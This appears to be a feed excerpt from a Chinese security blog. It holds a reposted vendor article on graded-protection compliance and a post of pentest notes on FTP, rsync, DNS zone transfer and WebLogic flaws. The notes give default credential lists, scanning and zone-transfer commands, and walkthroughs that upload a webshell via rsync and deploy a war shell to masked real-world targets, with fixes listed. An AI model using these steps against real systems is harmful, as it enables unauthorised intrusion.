&lt;h2 id=&quot;0x01-所谓安全攻击态势是什么&quot;&gt;&lt;a href=&quot;#0x01-所谓安全攻击态势是什么&quot; class=&quot;headerlink&quot; title=&quot;0x01 所谓安全攻击态势是什么&quot;&gt;&lt;/a&gt;0x01 所谓安全攻击态势是什么&lt;/h2&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="安全评估" scheme="http://pa55w0rd.github.io/tags/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"/>
    
      <category term="业务安全" scheme="http://pa55w0rd.github.io/tags/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>互联网企业的等级保护建设之路（转发）</title>
    <link href="http://pa55w0rd.github.io/%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%81%E4%B8%9A%E7%9A%84%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%BB%BA%E8%AE%BE%E4%B9%8B%E8%B7%AF/"/>
    <id>http://pa55w0rd.github.io/互联网企业的等级保护建设之路/</id>
    <published>2018-10-31T09:16:35.000Z</published>
    <updated>2018-11-21T08:50:46.955Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>From : <a href="http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/" target="_blank" rel="noopener">http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/</a></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>随着互联网企业的迅猛发展，其自身核心业务安全性的不断提升和行业监管力度的不断加强，如何应对与日俱增的内部需求和外部驱动，本文分析了互联网企业面临的安全威胁及合规监管，以及业内现有的针对该行业的安全建设内容，然后提出了我们基于三级等保的互联网企业信息安全建设思路，从整体上发现并解决互联网行业的安全问题。</p><a id="more"></a><h2 id="0x01-序-互联网企业的兴盛与隐患"><a href="#0x01-序-互联网企业的兴盛与隐患" class="headerlink" title="0x01 序-互联网企业的兴盛与隐患"></a>0x01 序-互联网企业的兴盛与隐患</h2><p>1994年，中国通过一条64K的国际专线接入互联网。20年后，互联网带给整个中国经济模式的改变已经影响到了社会的方方面面。可以说，互联网极大地改变了中国，而这种改变仍在继续。</p><p>中国拥有庞大的网民数量，大量的需求被创造，给新的互联网行业形态出现奠定良好基础。其次，中国互联网行业的商业模式日渐成熟。网络广告、搜索引擎、电子商务、网络支付等业务日渐被人接受，各大互联网公司从各自核心领域优势向这几个方面渗透，形成有序竞争，带动互联网行业良性发展。再次，中国网络基础设施的建设、4G/5G互联网的发展、国家政策的扶持规划，均给整个互联网行业创造了一个非常好的前景。</p><p>中国的互联网企业发展迅速，目前已有多家跻身全球互联网公司市值排行榜top10中，像大家熟知的阿里巴巴、京东、腾讯及百度均榜上有名。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/1-300x169.jpg" alt=""></p><p>相对于传统行业，互联网行业还显得很年轻，在一派欣欣向荣的快速发展背后，互联网行业同时隐藏着让人难以捉摸的巨大的安全风险，由于技术和监管的诸多问题，使得该行业已陷入危机四伏的困境中。</p><p>2016年4月3日，土耳其爆发重大数据泄露事件，近5000W土耳其公民个人信息被黑客打包放置网络上任人下载。为证明被盗数据的真实性，黑客还公布土耳其现任总统埃尔多安的个人信息以作示范。</p><p>2016年7月29日，越南两个机场被黑客攻击，这是越南遭受迄今最严重的黑客攻击事件。黑客通过攻陷机场电子显示屏及广播系统，散发“南海是中国的固有领土”等信息，给机场候机的乘客带来视觉和听觉上的冲击，造成的混乱远超常见的攻击网页行为。</p><p>而在最近披露的一项报道中，俄罗斯黑客成功盗取了2.723亿个帐号，以俄罗斯最受欢迎的电子邮件服务Mail.ru用户为主，此外还有Gmail地址、雅虎以及微软电邮Hotmail用户。数以亿计的数据目前正在“俄罗斯的地下黑市”出售。</p><p>不只是境外企业，国内互联网企业也正在成为最大的受害者。2016上半年，全国互联网企业安全漏洞总量同比增长181.9%。相关人士表示，目前互联网行业存在很大的安全隐患，而且伴随着相当程度的数据泄露风险。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/2-300x169.jpg" alt=""></p><h2 id="0x02-起-黑客重点攻击的行业目标"><a href="#0x02-起-黑客重点攻击的行业目标" class="headerlink" title="0x02 起-黑客重点攻击的行业目标"></a>0x02 起-黑客重点攻击的行业目标</h2><p>作为一种新生事物，互联网企业起步于民营企业，很多小平台风险意识淡薄，把关注重点放在扩大客户规模、赚取利润上。而技术防护则严重缺失，另外出于成本考虑，大多数企业采用廉价的开源系统，这些系统存在大量风险漏洞，安全性严重缺乏保障，企业数据安全岌岌可危。那么知名大企业又如何呢？随着互联网技术的发展，黑客技术也在升级，企业投入巨大财力和人力研发的系统，同样存在不可预知的问题。因此，也不可避免的遭受黑客的恶意攻击。近年来，知名大企业数据泄露事件频频发生，逐年增多。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/3-300x169.jpg" alt=""></p><p>据调查统计，黑客攻击互联网企业平台的目的主要为窃取数据，占比高达48%，其次为敲诈勒索和商业竞争。</p><p>通过攻陷大批互联网企业平台，引起系统瘫痪，黑客还能将数据恶意修改、洗劫一空。此外，黑客还可能通过申请账号、篡改数据、冒充投资人进行恶意提现甚至盗取资金。</p><p>企业数据泄露，造成的不只是业务的巨大损失，更为重要的是信誉上的丧失。互联网企业的门户网站作为信誉展示的首要平台，如果因为网站信息泄露、宕机、页面篡改等原因导致用户信任丧失，那么平台也就丢失了本身的信誉，成为无源之水。</p><p>因此，互联网企业如何有效保护信息安全，事关企业生死存亡。</p><h2 id="0x03-转-国家信息安全的基本保障制度"><a href="#0x03-转-国家信息安全的基本保障制度" class="headerlink" title="0x03 转-国家信息安全的基本保障制度"></a>0x03 转-国家信息安全的基本保障制度</h2><p>互联网行业是需要依托互联网的，其核心业务需要IT系统的支撑，因此安全是首当其冲的。而等级保护是国家推行的在Cyber空间安全的强制保护制度，其最终目的是保护信息系统和基础信息网络不受到侵害，保护用户的业务数据和系统的服务功能。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/4-300x56.jpg" alt=""></p><p>从1994年国务院颁布的《中华人民共和国计算机信息系统安全保护条例》（147号令）开始，到今年（2016年）10月份在昆明举办的由公安部网络安全保卫局、中央网信办网络安全协调局、工信部网络安全管理局、国家密码管理局、国家保密局、中国科学院办公厅为指导单位和由公安部第三研究所主办的第五届全国信息安全等级保护技术大会上提出的进入等级保护制度2.0时代为止，等级保护这一项国家政策已经走过逾20个年头，等级保护不仅是对信息安全产品或系统的检测、评估以及定级，更重要的，它是围绕信息安全保障全过程的一项基础性的国家管理制度，是一项基础性和制度性的工作。</p><p>如何帮助互联网企业有效的防范网络入侵、网络拒绝服务攻击以及网络非法监听等恶意网络行为，就有必要了解相应的合规要求。而国家等级保护标准中对于网络安全方面的要求，特别是对网络安全管理、访问控制、入侵防范、网络设备防护、安全审计的相关条款对于和网络密不可分的互联网企业来说，确实有着十分重要且重大的意义。</p><h2 id="0x04-赋-等级保护之于互联网企业的意义"><a href="#0x04-赋-等级保护之于互联网企业的意义" class="headerlink" title="0x04 赋-等级保护之于互联网企业的意义"></a>0x04 赋-等级保护之于互联网企业的意义</h2><p>在互联网产业不断融合的态势下，互联网跨界融合竞争的趋势越发凸显，线上与线下问题不断交织，新现象、新问题不断涌现，政府的管理也面临前所未有的挑战。因此从2015年，工信部开始进一步加强和改进互联网行业管理，促进互联网企业良性有序发展。”</p><p>信息安全是永远不变的话题，工信部部长苗圩认为应该高度重视我们所面临的严峻安全形势，大力提升网络与信息安全的保障能力。“促进互联网融合发展，安全是基础，更是保障，必须处理好安全与发展的关系，做到协调一致。不断健全互联网行业网络和信息安全机制，持续推进信息安全和体制化建设，推动完善网络安全的法律法规、标准体系，严格落实互联网企业信息安全的责任，加强网络信息安全监管和网络环境的综合治理。”</p><p>除却自身发展面临的网络安全问题，国家有关部门对互联网行业网络安全方面的监管力度也逐年增加。在内部需求和外部监管的双重压力下，加快互联网企业信息安全等级保护建设显得迫在眉睫。</p><p>国家等级保护的核心思想：</p><ul><li>全方位划分安全等级是实施信息安全等级保护的基本条件；</li><li>信息系统等级化安全设计是实施信息安全等级保护的基本方法。</li><li>信息安全技术和信息安全管理是实现信息系统安全的基础。企业必须根据安全建设目标将需求分析结果进行逐步细化，并转化为信息安全体系建设的总体安全策略，根据登记保护建设的具体要求，可以形成技术层面的安全管理和管理层面的安全策略并通过总体安全策略的落实构建安全技术体系和安全管理体系框架。对于互联网企业来说，实施信息安全等级保护测评能够有效地提高企业信息系统安全建设的整体水平，有效控制企业信息安全建设成本；有利于明确国家、法人和其他组织、公民的信息安全责任，加强企业信息安全管理。</li><li>对于企业的信息系统来说，通过等级保护测评可及时发现信息系统安全状况并制定方案进行整改，当信息系统完全达到安全保护能力要求时，信息系统就基本可做到“<strong>进不来、拿不走、改不了、看不懂、跑不了、可审计、打不垮</strong>”。</li><li>对抗能力和恢复能力已然构成了信息系统的安全保护能力。安全保护能力主要表现为信息系统应对威胁的能力，但当信息系统无法阻挡威胁对自身的破坏时，信息系统的恢复能力使系统在一定时间内恢复到原有状态，从而降低负面影响。</li><li>对信息安全技术和信息安全管理进行等级划分是信息系统安全等级保护的需要，也是对信息安全技术和信息安全管理进行规范化的需要。</li></ul><h2 id="0x05-比-互联网企业的等级保护解决方案"><a href="#0x05-比-互联网企业的等级保护解决方案" class="headerlink" title="0x05 比-互联网企业的等级保护解决方案"></a>0x05 比-互联网企业的等级保护解决方案</h2><p>按照国家信息安全等级保护的相关标准，互联网企业一般通过第三方测评机构或安全厂商按照如下流程进行等保建设：</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/5-300x99.jpg" alt=""></p><p>同时，按照等级保护中针对技术和管理的不同要求，应持续开展如下工作：</p><ul><li>【保障基础设施安全】保障网络周边环境和物理特性引起的网络设备和线路的持续使用。</li><li>【保障网络连接安全】保障网络传输中的安全，尤其保障网络边界和外部接入中的安全。</li><li>【保障计算环境的安全】保障操作系统、数据库、服务器、用户终端及相关商用产品的安全。</li><li>【保障应用系统安全】保障应用程序层对网络信息的保密性、完整性和信源的真实的保护和鉴别，防止和抵御各种安全威胁和攻击手段，在一定程度上弥补和完善现有操作系统和网络信息系统的安全风险。</li><li>【保障数据安全及备份恢复】保障数据完整性、数据保密性、备份和恢复等。</li><li>【安全管理体系保障】根据国家有关信息安全等级保护方面的标准和规范要求，建立一套切实可行的安全管理体系，加强安全管理机制。</li></ul><h2 id="0x06-兴-巨人背后的安全专家"><a href="#0x06-兴-巨人背后的安全专家" class="headerlink" title="0x06 兴-巨人背后的安全专家"></a>0x06 兴-巨人背后的安全专家</h2><p>针对互联网企业的信息安全等级保护建设，绿盟科技作为国内安全厂商当仁不让的领军品牌，基于对信息安全的深刻理解，以为互联网客户信息系统构建“等级化的安全体系”为等级保护工作的服务理念，旨在根据等级保护不同等级、不同阶段的业务特性、安全需求及安全应用重点，为互联网客户在等级保护的框架下构建一个安全、可靠、灵活、可持续改进的信息安全体系。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/6-300x169.jpg" alt=""></p><p>由于网约车新政的落地实施，交管局明令要求各大网约车平台尽可能快的进行线上业务系统的三级等级保护测评，因为最终测评通过与否关系着该平台营业执照的办理。</p><p>以下以易到租车为例，详细阐述绿盟科技针对互联网用户的信息安全等级保护建设。</p><p>各网约车平台由于自身业务系统的差异，对预约系统应用架构会有不同的设计，但基本的技术构成是类似的，其各部分的功能也相似。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/7-300x169.jpg" alt=""></p><p>针对易到租车预约APP核心应用的等保三级安全建设，绿盟科技本着“重点防护，纵深防御”的原则，在各服务器区以防火墙作为区域安全边界，为提高预约业务的整体安全性，各区域边界防火墙采用功能与性能兼备的产品，由此在整体布局上形成了“多层异构防火墙”安全架构。从业务功能上考虑，把这种安全架构划分成四个安全区域：互联网接入区、DMZ区（接入WEB服务器、RA服务器）、核心业务区（接入APP服务器、DB服务器）、数据中心内网区。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/8-300x169.jpg" alt=""></p><p><strong>互联网接入区：</strong></p><ul><li>部署链路分担设备，提供多ISP的互联网接入。</li><li>部署流量清洗，防御DDOS攻击</li><li>部署外网边界防火墙，实现互联网与DMZ区隔离</li></ul><p><strong>DMZ区：</strong></p><ul><li>部署WAF，为WEB服务器提供深层次的安全保护；</li><li>部署WEB-APP边界防火墙，实现DMZ与核心业务区的隔离；</li></ul><p><strong>核心业务区</strong></p><ul><li>APP服务器与DB服务器间可部署防火墙实现访问控制；</li><li>部署内网边界防火墙，实现核心业务区与数据中心服务器区间的隔离；</li><li>DB服务器旁路接入DAS，实现对数据库的监听与审计</li></ul><p><strong>数据中心内网区</strong></p><ul><li>采用“核心 —— 边缘”分区模块化架构，各服务器区围绕网络核心区部署，</li><li>各服务器区与网络核心区之间通过防火墙做访问控制；</li><li>内网核心旁路接入SAS-H，实现对IP可达的所有设备的单点登录及运维审计</li></ul><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/9-300x169.jpg" alt=""></p><p>安全技术手段作为支撑，辅以绿盟科技等保咨询服务，为客户搭建信息安全管理与策略体系。如此双管齐下，既能满足国家信息安全等级保护相关政策与标准要求，又可为客户搭建等级化的安全保障体系，在全面防护中突出重点，帮助客户最终通过等保三级测评，不仅提升了安全防护能力，也间接增强了客户的核心竞争力。</p><h2 id="0x07-终-NSFOCUS-伴您扬帆远航"><a href="#0x07-终-NSFOCUS-伴您扬帆远航" class="headerlink" title="0x07 终-NSFOCUS 伴您扬帆远航"></a>0x07 终-NSFOCUS 伴您扬帆远航</h2><p>互联网行业的三级安全等保技术要求，既有与其它行业要求的共性，又有其自己的特点。</p><p>三级等保对于互联网企业既是一次命题考试，又是一次切实提升企业安全能力的好机会。作为等保技术要求的主要部分——网络安全，因其分散、覆盖面广和难以管理，也是整个等保安全的难点。绿盟科技从网络与安全融合、终端与边界融合、集中与分级融合等多个维度，覆盖了包括结构安全、访问控制、安全审计、边界完整性、入侵防范、恶意代码入侵和设备防护在内的绝大多数技术要求，为互联网客户提供完整的三级等保解决方案方案。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;From : &lt;a href=&quot;http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;随着互联网企业的迅猛发展，其自身核心业务安全性的不断提升和行业监管力度的不断加强，如何应对与日俱增的内部需求和外部驱动，本文分析了互联网企业面临的安全威胁及合规监管，以及业内现有的针对该行业的安全建设内容，然后提出了我们基于三级等保的互联网企业信息安全建设思路，从整体上发现并解决互联网行业的安全问题。&lt;/p&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="等级保护" scheme="http://pa55w0rd.github.io/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>安全运维那些洞-Aerfa</title>
    <link href="http://pa55w0rd.github.io/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E9%82%A3%E4%BA%9B%E6%B4%9E/"/>
    <id>http://pa55w0rd.github.io/安全运维那些洞/</id>
    <published>2018-10-29T03:46:20.000Z</published>
    <updated>2018-11-21T08:54:13.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-Readme"><a href="#0-Readme" class="headerlink" title="0 Readme "></a>0 Readme </h1><p>来源于网络，回馈于网络。</p><p>以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。</p><p>这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。</p><p>仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。</p><a id="more"></a><h1 id="1-ftp匿名访问或弱口令"><a href="#1-ftp匿名访问或弱口令" class="headerlink" title="1 ftp匿名访问或弱口令 "></a>1 ftp匿名访问或弱口令 </h1><h2 id="1-1-ftp匿名访问"><a href="#1-1-ftp匿名访问" class="headerlink" title="1.1 ftp匿名访问 "></a>1.1 ftp匿名访问 </h2><p>Username = anonymous &amp;&amp; password = (null )</p><p>（1）cmd下，ftp xx.xx.xx.xx</p><p>（2）文件夹，<a href="ftp://xx.xx.xx.xx" target="_blank" rel="noopener">ftp://xx.xx.xx.xx</a></p><h2 id="1-2-ftp常见弱口令"><a href="#1-2-ftp常见弱口令" class="headerlink" title="1.2 ftp常见弱口令 "></a>1.2 ftp常见弱口令 </h2><p>（1）从wooyun的漏洞案例中看来，常见的弱口令：</p><p>网站域名（例如baidu.com） <code>baidu / baidu</code></p><p>（2）从xx项目中（漏扫扫出），弱口令为：</p><p><code>ftp / ftp</code></p><p>（3）网站使用lampp套装，未修改默认ftp密码：</p><p><code>nobody / lampp</code></p><h2 id="1-3-边学边用"><a href="#1-3-边学边用" class="headerlink" title="1.3 边学边用 "></a>1.3 边学边用 </h2><p>xx.xx.xx.xx 匿名访问 ftp / ftp<br>均可以登录</p><p> 使用8uftp登陆：</p><p><img src="\assets\img\安全运维\file_html_3d03e9ebaafe6524.png" alt=""></p><p>在文件夹中直接输入地址登陆：</p><p><img src="\assets\img\安全运维\file_html_fc4bacc7b391f84f.png" alt=""></p><p>比较两者之间的差异：前者下载文件会受到大小的限制，后者则不会。</p><p>xx.xx.xx.xx yy学校</p><p><img src="\assets\img\安全运维\file_html_e8776ff5ccdeee62.png" alt=""></p><p>xx.xx.xx.xx zz学校</p><p><img src="\assets\img\安全运维\file_html_158b89f932faeb71.png" alt=""></p><h1 id="2-rsync匿名访问"><a href="#2-rsync匿名访问" class="headerlink" title="2 rsync匿名访问 "></a>2 rsync匿名访问 </h1><p>参考： drops.wooyun.org/papers/161</p><p>rsync是一个远程数据同步工具，用 “rsync<br>算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p><p>下载文件：</p><p> ./rsync -vzrtopg –progress<br><a href="mailto:--deleteusername@xxx.xxx.xxx.xxx" target="_blank" rel="noopener">--deleteusername@xxx.xxx.xxx.xxx</a>::out<br>/home/test/getfile</p><p>上传文件： </p><p>/user/bin/rsync -vzrtopg –progress<br>/home/test/getfile</p><h2 id="2-1-利用方法"><a href="#2-1-利用方法" class="headerlink" title="2.1 利用方法"></a>2.1 利用方法</h2><p>rsync<br>默认端口是873，可使用nmap进行扫描：</p><p>nmap –n –open –p 873 x.x.x.x/24</p><p>尝试上传、下载文件( kali<br>中)：</p><p>rsync 10.210.208.39:: </p><p>或 rsync –vvvv<br>rsync://10.210.208.39::</p><h2 id="2-2-安全配置"><a href="#2-2-安全配置" class="headerlink" title="2.2 安全配置"></a>2.2 安全配置</h2><ul><li><p>限定访问IP：IP<br>Tables防火墙或修改配置文件rsync.conf</p></li><li><p>不允许匿名访问，添加用户口令</p></li></ul><h2 id="2-3-活学活用"><a href="#2-3-活学活用" class="headerlink" title="2.3 活学活用 "></a>2.3 活学活用 </h2><ul><li>xx.xx.xx.xx 连接失败</li></ul><p><img src="\assets\img\安全运维\file_html_86a6c0dd0ec67cd3.png" alt=""></p><ul><li>通信成功，却不知道该如何操作</li></ul><p><img src="\assets\img\安全运维\file_html_d6ea7f3e9ce65313.png" alt=""></p><ul><li>可以查看到目录，但是进一步访问需要密码</li></ul><p><img src="\assets\img\安全运维\file_html_93d8b6936279365a.png" alt=""></p><p>可以查看到目录，但是禁止进一步访问</p><p>xx窝</p><p><img src="\assets\img\安全运维\file_html_d416cd4216771f91.png" alt=""></p><ul><li><a href="http://www.xxx.gov.cn" target="_blank" rel="noopener">http://www.xxx.gov.cn</a> xx局</li></ul><p><code>rsync -v xx.xx.xx.xx::</code></p><p><img src="\assets\img\安全运维\file_html_29db8cfd2f6f9255.png" alt=""></p><p>上传webshell: # rsync -av /root/Desktop/youxiu.aspx<br>xx.xx.xx.xx::Etest</p><p><img src="\assets\img\安全运维\file_html_7ba40be2f34f1334.png" alt=""></p><p>确认是否成功：# rsync -v xx.xx.xx.xx::Etest</p><p><img src="\assets\img\安全运维\file_html_ac23219ff525104.png" alt=""></p><p>获取wenshell: <a href="http://www.xx.cn/youxiu.aspx" target="_blank" rel="noopener">http://www.xx.cn/youxiu.aspx</a> admin</p><p><img src="\assets\img\安全运维\file_html_c97ac1aa5603d31e.png" alt=""></p><p>xx.xx.xx.xx yy公司OA系统</p><p><img src="\assets\img\安全运维\file_html_afd89947e3e3b0f4.png" alt=""></p><h1 id="3-DNS域传送漏洞"><a href="#3-DNS域传送漏洞" class="headerlink" title="3 DNS域传送漏洞 "></a>3 DNS域传送漏洞 </h1><p>参考： drops.wooyun.org/papers/64</p><p>DNS主备之间数据同步使用的是dns域传送，如果配置不当，就会导致匿名用户获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p><h2 id="3-1-漏洞成因"><a href="#3-1-漏洞成因" class="headerlink" title="3.1 漏洞成因 "></a>3.1 漏洞成因 </h2><p>默认安装BIND<br>，配置项中没有allow-transfer项，就会出现dns域传送<br>漏洞</p><p>域传送关键配置项:</p><p>allow-transfer{ipaddress;};<br>通过ip限制可进行域传送的服务器</p><p>allow-transfer{key transfer;};<br>通过key限制可以进行域传送的服务器</p><p>设置方式有两种：</p><ul><li><p>在option配置域</p></li><li><p>在zone配置域</p></li></ul><p>优先级为： zone &gt; option</p><h2 id="3-2-攻击方式"><a href="#3-2-攻击方式" class="headerlink" title="3.2 攻击方式 "></a>3.2 攻击方式 </h2><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。导致一些非公开域名（测试域名、内部域名）泄露。而此类域名的安全性相对较低，更容易遭受攻击者的攻击，比如内部测试机往往缺乏必要的安全设置。</p><ul><li>dos下进行测试</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ljn&gt;nslookup</span><br><span class="line"></span><br><span class="line">&gt; <span class="builtin-name">set</span> <span class="attribute">type</span>=ns</span><br><span class="line"></span><br><span class="line">&gt; 12306.cn</span><br><span class="line"></span><br><span class="line">&gt;<span class="built_in"> server </span>dns1.zdnscloud.biz</span><br><span class="line"></span><br><span class="line">&gt; ls 12306.cn</span><br></pre></td></tr></table></figure><ul><li>kali中进行测试</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\# dig @<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> <span class="number">12306.</span>cn axfr</span><br><span class="line">(<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>为dns服务器IP，<span class="number">12306.</span>cn为测试域名)</span><br><span class="line"></span><br><span class="line">或 \# dnsenum <span class="number">12306.</span>cn</span><br></pre></td></tr></table></figure><h2 id="3-3-修复方案"><a href="#3-3-修复方案" class="headerlink" title="3.3 修复方案 "></a>3.3 修复方案 </h2><p>只需在限制相应的zone、optio中添加allow-transfer限制可以进行同步的服务器，限制方式有两种:</p><ul><li>限制IP</li><li>使用key认证。</li></ul><h1 id="4-weblogic弱口令"><a href="#4-weblogic弱口令" class="headerlink" title="4 weblogic弱口令 "></a>4 weblogic弱口令 </h1><p>参考： drops.wooyun.org/tips/402</p><h2 id="4-1-基本信息"><a href="#4-1-基本信息" class="headerlink" title="4.1 基本信息 "></a>4.1 基本信息 </h2><p>Weblogic是美国bea公司出品的一个application<br>server（基于javaee架构的中间件），BEA<br>Weblogic用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的java应用服务器。</p><p>很多weblogic服务器安装时采用默认密码，攻击者很容易进入weblogic控制台获取相应权限。</p><p>默认weblogic管理员账号密码： <code>weblogic /weblogic</code></p><p>默认weblogic开放端口： 7001</p><p>默认weblogic访问路径：<br><code>http://xxxx:7001/console</code></p><p>从Default Passwords |<br>CIRT.net获取常见weblogic默认密码：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Oracle-WebLogic：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="number">11</span>g：weblogic / welcome1 (实践)</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic：system / password</span><br><span class="line"></span><br><span class="line">Oracle-Weblogic(Version: <span class="number">9.0</span> Beta(Diablo))：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：admin / security</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：mary / password</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：joe / password</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：wlcsystem / wlcsystem</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：wlpisystem / wlpisystem</span><br></pre></td></tr></table></figure></p><p>查看wooyun漏洞案例，积累常见弱口令：<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">weblogic / weblogic123</span><br><span class="line"></span><br><span class="line">weblogic / <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line">admin / <span class="number">12345678</span></span><br></pre></td></tr></table></figure></p><h2 id="4-2-利用方式"><a href="#4-2-利用方式" class="headerlink" title="4.2 利用方式 "></a>4.2 利用方式 </h2><p>寻找weblogic服务器方法：</p><ul><li><p>使用 IIS PUT Scaner<br>扫描80、8080端口，查看HTTP<br>banner信息，确定为weblogic；</p></li><li><p>直接扫描7001端口或者baidu<br>inurl: :7001/console (待尝试)</p></li></ul><p>利用弱口令进入管理后台，在控制台部署一个web应用：</p><p>Deploy =&gt; web application modules =&gt; Deploy a new Web Application<br>Module… =&gt;upload your file(s) =&gt; Deploy</p><p>在Web应用中包含模块：必须要有一个servlet或JSP<br>web.xml文件，包含web应用程序的信息</p><h2 id="4-3-安全配置"><a href="#4-3-安全配置" class="headerlink" title="4.3 安全配置 "></a>4.3 安全配置 </h2><p><a href="http://download.oracle.com/docs/cd/E12890\_01/ales/docs32/integrateappenviron/configWLS.html\#wp1099454" target="_blank" rel="noopener">http://download.oracle.com/docs/cd/E12890\_01/ales/docs32/integrateappenviron/configWLS.html\#wp1099454</a></p><h2 id="4-4-现学现卖"><a href="#4-4-现学现卖" class="headerlink" title="4.4 现学现卖 "></a>4.4 现学现卖 </h2><p><a href="http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp</a></p><p><img src="\assets\img\安全运维\file_html_a09bb089c1c3b312.png" alt=""></p><p>weblogic / 12345678</p><p><img src="\assets\img\安全运维\file_html_6d6c9016367bb35b.png" alt=""></p><p>部署war包（war包其实是index.jsp + META-INF + WEB-INF的压缩包）：</p><p>先制作war包（需安装java环境）：</p><p>c:\app&gt;cd c:/program files/java/dk1.8.0_31/bin</p><p>c:\Program Files\Java\jdk1.8.0_31\bin&gt;jar -cvf app.war c:/app</p><p><img src="\assets\img\安全运维\file_html_3493c9640cf370ac.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_ba1e3acff7df0d95.png" alt=""></p><p>部署——&gt;安装——&gt;上载文件——&gt;一直点确定即可，得到shell</p><p>（自己制作war包失败，重新下载了一个war包，上传）</p><p><a href="http://xx.xx.xx.xx:7001/index/a.jsp" target="_blank" rel="noopener">http://xx.xx.xx.xx:7001/index/a.jsp</a> (安全起见，已删除)</p><p><a href="http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E%3A\\phpstudy\\WWW" target="_blank" rel="noopener">http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E%3A\\phpstudy\\WWW</a></p><p><img src="\assets\img\安全运维\file_html_cf68ba09dbca62df.png" alt=""></p><p>翻目录：</p><p><img src="\assets\img\安全运维\file_html_63592e979d64fae2.png" alt=""></p><p><a href="http://xx.xx.xx.xx/weimall" target="_blank" rel="noopener">http://xx.xx.xx.xx/weimall</a> mall.xx.cn v.xx.cn</p><p><img 